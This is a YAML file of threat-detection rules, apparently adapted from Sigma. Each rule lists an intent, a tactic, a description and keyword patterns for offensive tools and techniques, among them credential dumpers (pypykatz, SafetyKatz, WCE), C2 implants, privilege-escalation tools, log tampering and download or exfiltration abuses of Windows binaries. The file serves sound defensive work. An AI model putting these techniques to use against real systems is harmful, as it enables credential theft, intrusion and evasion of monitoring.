- id: sigma_fca949cc_79ca_446e_8064_01aa7e52ece5
  intent: reconnaissance
  tactic: discovery
  description: Detects suspicious use of PCHunter, a tool like Process Hacker to view
    and manipulate processes, kernel options and other low level stuff
  conditions:
    summary:
      regex_any:
      - hacktool
      - pchunter
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56c217c3_2de2_479b_990f_5c109ba8458f
  intent: unknown
  tactic: g0060
  description: Detects the creation of a schtask via PowerSploit or Empire Default
    Configuration.
  conditions:
    summary:
      regex_any:
      - hacktool
      - default
      - powersploit
      - empire
      - scheduled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a34f79a3_8e5f_4cc3_b765_de00695452c2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of the tool PowerTool which has the ability to
    kill a process, delete its process file, unload drivers, and delete the driver
    files
  conditions:
    summary:
      regex_any:
      - hacktool
      - powertool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff23ffbc_3378_435e_992f_0624dcf93ab4
  intent: unknown
  tactic: resource_development
  description: Detects the execution of the PurpleSharp adversary simulation tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - purplesharp
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a29808fd_ef50_49ff_9c7a_59a9b040b404
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the usage of "pypykatz" to obtain stored credentials. Adversaries
    may attempt to extract credential material from the Security Account Manager (SAM)
    database through Windows registry where the SAM database is stored
  conditions:
    summary:
      regex_any:
      - hacktool
      - pypykatz
      - credentials
      - dumping
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0685b176_c816_4837_8e7b_1216f346636b
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of the Quarks PwDump tool via commandline arguments
  conditions:
    summary:
      regex_any:
      - hacktool
      - quarks
      - pwdump
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_95022b85_ff2a_49fa_939a_d7b8f56eeb9b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects actions caused by the RedMimicry Winnti playbook a automated
    breach emulations utility
  conditions:
    summary:
      regex_any:
      - hacktool
      - redmimicry
      - winnti
      - playbook
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5589ab4f_a767_433c_961d_c91f3f704db1
  intent: credential_harvesting
  tactic: credential_access
  description: Detects different hacktools used for relay attacks on Windows for privilege
    escalation
  conditions:
    summary:
      regex_any:
      - potential
      - relay
      - attack
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ec2c172_dceb_4c10_92c9_87c1881b7e18
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the execution of the hacktool Rubeus via PE information of
    command line parameters
  conditions:
    summary:
      regex_any:
      - hacktool
      - rubeus
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1876533_4ed5_4a83_90f3_b8645840a413
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the execution of the hacktool SafetyKatz via PE information
    and default Image name
  conditions:
    summary:
      regex_any:
      - hacktool
      - safetykatz
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7679d464_4f74_45e2_9e01_ac66c5eb041a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the execution of SecurityXploded Tools
  conditions:
    summary:
      regex_any:
      - hacktool
      - securityxploded
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52ff7941_8211_46f9_84f8_9903efb7077d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of parent process ID spoofing tools like Didier Stevens
    tool SelectMyParent
  conditions:
    summary:
      regex_any:
      - hacktool
      - ppid
      - spoofing
      - selectmyparent
      - tool
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_26488ad0_f9fd_4536_876f_52fea846a2e4
  intent: persistence_installation
  tactic: persistence
  description: Detects the execution of the hacktool SharPersist - used to deploy
    various different kinds of persistence mechanisms
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpersist
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bedfc8ad_d1c7_4e37_a20e_e2b0dbee759c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of SharpEvtHook, a tool that tampers with the Windows
    event logs
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpevtmute
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d9367cbb_c2e0_47ce_bdc0_128cb6da898d
  intent: reconnaissance
  tactic: discovery
  description: Detects SharpLdapWhoami, a whoami alternative that queries the LDAP
    service on a domain controller
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpldapwhoami
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_055fb54c_a8f4_4aee_bd44_f74cf30a0d9d
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects the execution of SharpMove, a .NET utility performing multiple
    tasks such as "Task Creation", "SCM" query, VBScript execution using WMI via its
    PE metadata and command line options.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpmove
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_38a1ac5f_9c74_47d2_a345_dd6f5eb4e7c8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the execution of SharpSuccessor, a tool used to exploit the
    BadSuccessor attack for privilege escalation in WinServer 2025 Active Directory
    environments.

    Successful usage of this tool can let the attackers gain the domain admin privileges
    by exploiting the BadSuccessor vulnerability.

    '
  conditions:
    summary:
      regex_any:
      - hktl
      - sharpsuccessor
      - privilege
      - escalation
      - tool
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c484e533_ee16_4a93_b6ac_f0ea4868b2f1
  intent: execution
  tactic: execution
  description: Detects the use of SharpUp, a tool for local privilege escalation
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpup
      - privesc
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b2317cfa_4a47_4ead_b3ff_297438c0bc2d
  intent: reconnaissance
  tactic: discovery
  description: Adversaries may look for details about the network configuration and
    settings of systems they access or through information discovery of remote systems
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpview
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b0ce780f_10bd_496d_9067_066d23dc3aa5
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects the execution of SharpWSUS or WSUSpendu, utilities that allow
    for lateral movement through WSUS.

    Windows Server Update Services (WSUS) is a critical component of Windows systems
    and is frequently configured in a way that allows an attacker to circumvent internal
    networking limitations.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpwsus
      - wsuspendu
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cf93e05e_d798_4d9e_b522_b0248dc61eaf
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects usage of the Sharp Chisel via the commandline arguments
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpchisel
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7d33b50_f690_4b51_8cfb_0fb912a31e57
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of the SharpDPAPI tool based on CommandLine
    flags and PE metadata.

    SharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpdpapi
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f89b08d0_77ad_4728_817b_9b16c5a69c7a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the SharpImpersonation tool. Which can be used
    to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpimpersonation
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f8fc146_1d1a_4dbf_b8fd_dfae15e08541
  intent: reconnaissance
  tactic: discovery
  description: Detects execution of the SharpLDAPmonitor. Which can monitor the creation,
    deletion and changes to LDAP objects.
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpldapmonitor
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_03552375_cc2c_4883_bbe4_7958d5a980be
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects SILENTTRINITY stager use via PE metadata
  conditions:
    summary:
      regex_any:
      - hacktool
      - silenttrinity
      - stager
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42333b2c_b425_441c_b70e_99404a17170f
  intent: execution
  tactic: execution
  description: Detects process activity patterns as seen being used by Sliver C2 framework
    implants
  conditions:
    summary:
      regex_any:
      - hacktool
      - sliver
      - implant
      - activity
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e92a4287_e072_4a40_9739_370c106bb750
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the execution of SOAPHound, a .NET tool for collecting Active
    Directory data, using specific command-line arguments that may indicate an attempt
    to extract sensitive AD information.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - soaphound
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a4d9232_92fc_404d_8ce1_4c92e7caf539
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Stracciatella which executes a Powershell runspace from within
    C# (aka SharpPick technique) with AMSI, ETW and Script Block Logging disabled
    based on PE metadata characteristics.
  conditions:
    summary:
      regex_any:
      - hacktool
      - stracciatella
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a7e90c5_fe6e_45dc_889e_057fe4378bd9
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the execution of the PoC that can be used to exploit Sysmon
    CVE-2022-41120
  conditions:
    summary:
      regex_any:
      - hacktool
      - sysmoneop
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_69ca006d_b9a9_47f5_80ff_ecd4d25d481a
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of TruffleSnout.exe an iterative AD discovery toolkit
    for offensive operators, situational awareness and targeted low noise enumeration.
  conditions:
    summary:
      regex_any:
      - hacktool
      - trufflesnout
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d38d2fa4_98e6_4a24_aff1_410b0c9ad177
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the execution of UACMe, a tool used for UAC bypasses, via default
    PE metadata
  conditions:
    summary:
      regex_any:
      - hacktool
      - uacme
      - akagi
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7aa7009a_28b9_4344_8c1f_159489a390df
  intent: unknown
  tactic: s0005
  description: 'Detects the use of Windows Credential Editor (WCE), a popular post-exploitation
    tool used to extract plaintext passwords, hash, PIN code and Kerberos tickets
    from memory.

    It is often used by threat actors for credential dumping and lateral movement
    within compromised networks.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - windows
      - credential
      - editor
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98b53e78_ebaf_46f8_be06_421aafd176d9
  intent: reconnaissance
  tactic: discovery
  description: WinPEAS is a script that search for possible paths to escalate privileges
    on Windows hosts. The checks are explained on book.hacktricks.xyz
  conditions:
    summary:
      regex_any:
      - hacktool
      - winpeas
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d557dc06_62e8_4468_a8e8_7984124908ce
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects commandline keywords indicative of potential usge of the tool
    WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - winpwn
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_022eaba8_f0bf_4dd9_9217_4604b0bb3bb0
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the execution of PowerShell with a specific flag sequence that
    is used by the Wmiexec script
  conditions:
    summary:
      regex_any:
      - hacktool
      - wmiexec
      - default
      - powershell
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_66e563f9_1cbd_4a22_a957_d8b7c0f44372
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious use of XORDump process memory dumping utility
  conditions:
    summary:
      regex_any:
      - hacktool
      - xordump
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90dcf730_1b71_4ae7_9ffc_6fcf62bd0132
  intent: defense_evasion
  tactic: defense_evasion
  description: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools
    into a password-protected zip file.
  conditions:
    summary:
      regex_any:
      - suspicious
      - zipexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_023394c4_29d5_46ab_92b8_6a534c6f447b
  intent: unknown
  tactic: g0032
  description: Detects suspicious Hangul Word Processor (Hanword) sub processes that
    could indicate an exploitation
  conditions:
    summary:
      regex_any:
      - suspicious
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4e762605_34a8_406d_b72e_c1a089313320
  intent: defense_evasion
  tactic: defense_evasion
  description: 'HxTsr.exe is a Microsoft compressed executable file called Microsoft
    Outlook Communications.

    HxTsr.exe is part of Outlook apps, because it resides in a hidden "WindowsApps"
    subfolder of "C:\Program Files".

    Any instances of hxtsr.exe not in this folder may be malware camouflaging itself
    as HxTsr.exe

    '
  conditions:
    summary:
      regex_any:
      - potential
      - fake
      - instance
      - hxtsr
      - executed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ae81040_fc1c_4249_bfa3_938d260214d9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of icacls to deny access for everyone in Users folder sometimes
    used to hide malicious files
  conditions:
    summary:
      regex_any:
      - icacls
      - hide
      - file
      - everyone
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9801abb8_e297_4dbf_9fbd_57dde0e830ad
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of the IEExec utility to download and execute files
  conditions:
    summary:
      regex_any:
      - file
      - download
      - execution
      - ieexec
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b2b048b0_7857_4380_b0fb_d3f0ab820b71
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of iexpress.exe to create binaries via Self Extraction
    Directive (SED) files located in potentially suspicious locations.

    This behavior has been observed in-the-wild by different threat actors.

    '
  conditions:
    summary:
      regex_any:
      - self
      - extracting
      - package
      - creation
      - iexpress
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4ed6030_ffe5_4e6a_8a8a_ab3c1ab9d94e
  intent: defense_evasion
  tactic: defense_evasion
  description: Disables HTTP logging on a Windows IIS web server as seen by Threat
    Group 3390 (Bronze Union)
  conditions:
    summary:
      regex_any:
      - disable
      - windows
      - http
      - logging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d3cdeec_c0db_45b4_aa86_082f7eb75701
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the Internet Information Services (IIS) command-line tool,
    AppCmd, being used to list passwords
  conditions:
    summary:
      regex_any:
      - microsoft
      - service
      - account
      - password
      - dumped
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9465ddf4_f9e4_4ebd_8d98_702df3a93239
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious IIS native-code module installations via command
    line
  conditions:
    summary:
      regex_any:
      - native
      - code
      - module
      - command
      - line
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7c8af9b2_dcae_41a2_a9db_b28c288b5f08
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of "appcmd" to create new global URL rewrite rules. This
    behaviour has been observed being used by threat actors to add new rules so they
    can access their webshells.
  conditions:
    summary:
      regex_any:
      - suspicious
      - globalrules
      - rewrite
      - appcmd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_97dbf6e2_e436_44d8_abee_4261b24d3e41
  intent: credential_harvesting
  tactic: credential_access
  description: Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings.
    An attacker with Microsoft IIS web server access via a webshell or alike can decrypt
    and dump any hardcoded connection strings, such as the MSSQL service account password
    using aspnet_regiis command.
  conditions:
    summary:
      regex_any:
      - microsoft
      - connection
      - strings
      - decryption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0649be4a_aeb0_45b0_b89e_7f1668f6d9c0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects attempts to delete Internet Information Services (IIS) log
    files via command line utilities, which is a common defense evasion technique
    used by attackers to cover their tracks.

    Threat actors often abuse vulnerabilities in web applications hosted on IIS servers
    to gain initial access and later delete IIS logs to evade detection.

    '
  conditions:
    summary:
      regex_any:
      - webserver
      - deletion
      - commandline
      - utilities
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_043c4b8b_3a54_4780_9682_081cb6b8185c
  intent: persistence_installation
  tactic: persistence
  description: Detects a suspicious IIS module registration as described in Microsoft
    threat report on IIS backdoors
  conditions:
    summary:
      regex_any:
      - suspicious
      - module
      - registration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_850d55f9_6eeb_4492_ad69_a72338f65ba4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of "Ilasm.EXE" in order to compile C# intermediate
    (IL) code to EXE or DLL.
  conditions:
    summary:
      regex_any:
      - code
      - compilation
      - ilasm
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f11f2808_adb4_46c0_802a_8660db50fa99
  intent: execution
  tactic: execution
  description: Detects unusual parent or children of the ImagingDevices.exe (Windows
    Contacts) process as seen being used with Bumblebee activity
  conditions:
    summary:
      regex_any:
      - imagingdevices
      - unusual
      - parent
      - child
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_863218bd_c7d0_4c52_80cd_0a96c09f54af
  intent: execution
  tactic: execution
  description: Detects usage of "IMEWDBLD.exe" to download arbitrary files
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - imewdbld
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ce7cf472_6fcc_490a_9481_3786840b5d9b
  intent: defense_evasion
  tactic: defense_evasion
  description: Executes SCT script using scrobj.dll from a command in entered into
    a specially prepared INF file.
  conditions:
    summary:
      regex_any:
      - infdefaultinstall
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75edd216_1939_4c73_8d61_7f3a0d85b5cc
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects use of .NET InstallUtil.exe in order to download arbitrary
    files. The files will be written to "%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\"

    '
  conditions:
    summary:
      regex_any:
      - file
      - download
      - installutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d042284c_a296_4988_9be5_f424fadcc28c
  intent: defense_evasion
  tactic: defense_evasion
  description: Uses the .NET InstallUtil.exe application in order to execute image
    without log
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - installutil
      - without
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90fb5e62_ca1f_4e22_b42e_cc521874c938
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious shell spawn from Java utility keytool process (e.g.
    adselfservice plus exploitation)
  conditions:
    summary:
      regex_any:
      - suspicious
      - shells
      - spawn
      - java
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cea2b7ea_792b_405f_95a1_b903ea06458f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious child processes of the "Manage Engine ServiceDesk
    Plus" Java web service
  conditions:
    summary:
      regex_any:
      - suspicious
      - child
      - process
      - manage
      - engine
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8f88e3f6_2a49_48f5_a5c4_2f7eedf78710
  intent: execution
  tactic: execution
  description: Detects a JAVA process running with remote debugging allowing more
    than just localhost to connect
  conditions:
    summary:
      regex_any:
      - java
      - running
      - with
      - remote
      - debugging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0d34ed8b_1c12_4ff2_828c_16fc860b766d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious processes spawned from a Java host process which
    could indicate a sign of exploitation (e.g. log4j)
  conditions:
    summary:
      regex_any:
      - suspicious
      - processes
      - spawned
      - java
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dff1e1cc_d3fd_47c8_bfc2_aeb878a754c0
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects shell spawned from Java host process, which could be a sign
    of exploitation (e.g. log4j exploitation)
  conditions:
    summary:
      regex_any:
      - shell
      - process
      - spawned
      - java
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_60bfeac3_0d35_4302_8efb_1dd16f715bc6
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects suspicious child processes of SysAidServer (as seen in MERCURY
    threat actor intrusions)
  conditions:
    summary:
      regex_any:
      - suspicious
      - sysaidserver
      - child
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d047726b_c71c_4048_a99b_2e2f50dc107d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a signed binary dropped by Kaspersky Lab Products
    Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands
    and binaries.
  conditions:
    summary:
      regex_any:
      - kavremover
      - dropped
      - binary
      - lolbin
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_27ee9438_90dc_4bef_904b_d3ef927f5e7e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects execution of the Windows Kernel Debugger "kd.exe".
  conditions:
    summary:
      regex_any:
      - windows
      - kernel
      - debugger
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ed99dda_6a35_11ef_8c99_0242ac120002
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the presence of "UWhRC....AAYBAAAA" pattern in command line.

    The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds
    to a marshaled CREDENTIAL_TARGET_INFORMATION structure.

    Attackers can use this technique to coerce authentication from victim systems
    to attacker-controlled hosts.

    It is one of the strong indicators of a Kerberos coercion attack, where adversaries
    manipulate DNS records

    to spoof Service Principal Names (SPNs) and redirect authentication requests like
    in CVE-2025-33073.

    If you see this pattern in the command line, it is likely an attempt to add spoofed
    Service Principal Names (SPNs) to DNS records,

    or checking for the presence of such records through the `nslookup` command.

    '
  conditions:
    summary:
      regex_any:
      - attempts
      - kerberos
      - coercion
      - spoofing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ca5583e9_8f80_46ac_ab91_7f314d13b984
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potentially suspicious child processes of KeyScrambler.exe
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - process
      - keyscrambler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_de16d92c_c446_4d53_8938_10aeef41c8b6
  intent: execution
  tactic: execution
  description: Detects password change for the computer's domain account or host principal
    via "ksetup.exe"
  conditions:
    summary:
      regex_any:
      - computer
      - password
      - change
      - ksetup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c9783e20_4793_4164_ba96_d9ee483992c4
  intent: execution
  tactic: execution
  description: Detects password change for the logged-on user's via "ksetup.exe"
  conditions:
    summary:
      regex_any:
      - logged
      - user
      - password
      - change
      - ksetup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f7a6757_ff79_46db_9687_66501a02d9ec
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects the execution of "ldifde.exe" in order to export organizational
    Active Directory structure.
  conditions:
    summary:
      regex_any:
      - active
      - directory
      - structure
      - export
      - ldifde
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f535e01_ca1f_40be_ab8d_45b19c0c8b7f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "Ldifde.exe" with the import flag "-i". The
    can be abused to include HTTP-based arguments which will allow the arbitrary download
    of files from a remote server.

    '
  conditions:
    summary:
      regex_any:
      - import
      - ldap
      - data
      - interchange
      - format
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e968eb1_5f05_4dac_94e9_fd0c5cb49fd6
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects an uncommon parent process of "LINK.EXE".

    Link.EXE in Microsoft incremental linker. Its a utility usually bundled with Visual
    Studio installation.

    Multiple utilities often found in the same folder (editbin.exe, dumpbin.exe, lib.exe,
    etc) have a hardcode call to the "LINK.EXE" binary without checking its validity.

    This would allow an attacker to sideload any binary with the name "link.exe" if
    one of the aforementioned tools get executed from a different location.

    By filtering the known locations of such utilities we can spot uncommon parent
    process of LINK.EXE that might be suspicious or malicious.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - link
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc9d3712_6310_4320_b2df_7cb408274d53
  intent: execution
  tactic: execution
  description: Detects the execution of "lodctr.exe" to rebuild the performance counter
    registry values. This can be abused by attackers by providing a malicious config
    file to overwrite performance counter configuration to confuse and evade monitoring
    and security solutions.
  conditions:
    summary:
      regex_any:
      - rebuild
      - performance
      - counter
      - values
      - lodctr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd1f961e_0b96_436b_b7c6_38da4583ec00
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of "logman" utility in order to disable or delete
    Windows trace sessions
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - trace
      - session
      - tamper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84b14121_9d14_416e_800b_f3b829c5a14d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of CustomShellHost binary where the child isn't
    located in 'C:\Windows\explorer.exe'
  conditions:
    summary:
      regex_any:
      - suspicious
      - customshellhost
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e290b10b_1023_4452_a4a9_eb31a9013b3a
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects when a user performs data exfiltration by using DataSvcUtil.exe
  conditions:
    summary:
      regex_any:
      - lolbas
      - data
      - exfiltration
      - datasvcutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b8b1b304_a60f_4999_9a6e_c547bde03ffd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of DeviceCredentialDeployment to hide a process
    from view
  conditions:
    summary:
      regex_any:
      - devicecredentialdeployment
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc268ac1_42d9_40fd_9ed3_8c4e1a5b87e6
  intent: defense_evasion
  tactic: defense_evasion
  description: The Devtoolslauncher.exe executes other binary
  conditions:
    summary:
      regex_any:
      - devtoolslauncher
      - executes
      - specified
      - binary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b369ced_4b1d_48f1_b427_fdc0de0790bd
  intent: defense_evasion
  tactic: defense_evasion
  description: Compress target file into a cab file stored in the Alternate Data Stream
    (ADS) of the target file.
  conditions:
    summary:
      regex_any:
      - suspicious
      - diantz
      - alternate
      - data
      - stream
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_185d7418_f250_42d0_b72e_0c8b70661e93
  intent: command_and_control_setup
  tactic: command_and_control
  description: Download and compress a remote file and store it in a cab file on local
    machine.
  conditions:
